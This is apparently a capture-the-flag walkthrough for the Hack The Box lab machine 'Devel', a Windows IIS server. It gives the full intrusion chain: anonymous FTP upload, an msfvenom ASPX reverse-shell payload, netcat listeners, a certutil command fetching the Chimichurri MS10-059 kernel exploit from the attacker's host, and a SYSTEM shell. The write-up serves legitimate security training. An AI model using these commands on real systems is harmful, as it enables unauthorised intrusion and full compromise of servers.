---
description: https://www.hackthebox.eu/home/machines/profile/3
---

# Devel

## \*\*Nmap \*\*

```
nmap 10.10.10.5 -p- -A -T4

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

As we can see we have port 21 and port 80 open. I will start by hitting port 80 with `gobuster` and `nikto` to save some time and will then jump into port 21.

## FTP

From the `nmap` results earlier we can see FTP is running on port 21 and anonymous login is allowed. (nmap will check this by default). We successfully login as per below:

![ftp on port 21](<../../../.gitbook/assets/image (134) (1).png>)

We are able to login with a blank password using the anonymous login. We can see the aspnet\_client directory where if we follow leads us to a directory with the .NET framework version it is running under.

![](<../../../.gitbook/assets/image (135) (1).png>)

We can take a note of the version running on the machine in the event we need it. From the login directory of the FTP we can see the welcome page "welcome.png" for IIS. When viewing this we can see the server is running IIS7.

![IIS7 welcome.png](<../../../.gitbook/assets/image (136) (1).png>)

## File Upload

As it is possible the FTP has been misconfigured we should check to see if we can perform a file upload. If we are able to perform this it is probable we could access uploaded files in the web browser and get a reverse shell on the server.

![testing ftp file upload](<../../../.gitbook/assets/image (137) (1).png>)

We can see when we now browse to the file in a web browser we can see our text file confirming file upload.

## Payload Creation

![file upload on ftp](<../../../.gitbook/assets/image (138) (1).png>)

At this point we should see if we can get a reverse shell uploaded and hopefully we can execute it as well. As this is an IIS server we would ideally need to use a ASP or ASPX reverse shell. We can create these with `msfvenom`.

We need to use the following payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx  -o /home/kali/Desktop/upload.aspx
```

{% hint style="info" %}
netcat does not handle staged payloads well so the payload above is unstaged.
{% endhint %}

I used port 443 for my port in the payload as this is a reliable connection that is usually open on web servers.

We can upload the payload to the server using the `put` command.

![uploading our payload to the ftp](<../../../.gitbook/assets/image (139) (1).png>)

## Reverse Shell

Before attempting to execute the payload we need to set up a `netcat` listener to catch the reverse shell. if we are using a port within the 1-1024 range we will need to use `sudo`

![setting up a nc listener on port 443](<../../../.gitbook/assets/image (140).png>)

We can now browse to the directory of the file we uploaded.

![](<../../../.gitbook/assets/image (141) (1).png>)

![Low privilege shell](<../../../.gitbook/assets/image (142) (1).png>)

After checking back on `netcat` we have a shell as a low privilege account on the server.

## Privilege Escalation

We should now run the `systeminfo` command to see what initial information we can gather regarding the system. Taking note the important fields such as OS Name and System Type.

![](<../../../.gitbook/assets/image (143) (1).png>)

We can take the `systeminfo` information and run this against Windows exploit suggester.

![Window exploit suggester.](<../../../.gitbook/assets/image (144) (1).png>)

The exploit we are interested in above is MS10-059. This is a kernel level exploit which affects the following:

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Vulnerability Identifier**: CVE-2010-2554; CVE-2010-2555                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Risk**: Important                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Affected Software**:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| <ul><li>Windows 7 for 32-bit Systems</li><li>Windows 7 for x64-based Systems</li><li>Windows Server 2008 for 32-bit Systems</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2</li><li>Windows Server 2008 for Itanium-based Systems</li><li>Windows Server 2008 for Itanium-based Systems Service Pack 2</li><li>Windows Server 2008 for x64-based Systems</li><li>Windows Server 2008 for x64-based Systems Service Pack 2</li><li>Windows Server 2008 R2 for x64-based Systems</li><li>Windows Vista Service Pack 1</li><li>Windows Vista Service Pack 2</li><li>Windows Vista x64 Edition Service Pack 1</li><li>Windows Vista x64 Edition Service Pack 2</li></ul> |
| <p><strong>Description:</strong><br><br></p><p>This security update addresses vulnerabilities in the the Tracing Feature for Services that could allow increase in privilege once an attacker runs a specially crafted application.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                            |

In this scenario we are going to use the Chimichurri compiled exploit taken from the following GitHub link:

[https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled)

Once downloaded we can `cd` to the directory where we have the Chimichurri.exe on our attacking machine and start a `Python SimpleHTTPServer` with the following command:

```
python -m SimpleHTTPServer <PORT>
```

{% hint style="info" %}
If no port is specified Python will default to port 8000
{% endhint %}

We can then use `certutil.exe` on the Windows machine to download the executable from our attacking machine.

```
certutil.exe -urlcache -split -f "http://<IP>:<PORT>/chimichurri.exe"
```

![Downloading with certutil.exe](<../../../.gitbook/assets/image (145) (1).png>)

When attempting to run the executable we are given a usage example:

![](<../../../.gitbook/assets/image (146) (1).png>)

First we can set up a `netcat` listener on our attacking machine to catch the shell.

```
nc -lvp 4455
```

We can these use the following command to run Chimichurri.exe

```
Chimichurri.exe 10.10.14.31 4455
```

After waiting a short while we should gain a shell as NT Authority\system

![](<../../../.gitbook/assets/image (147) (1).png>)
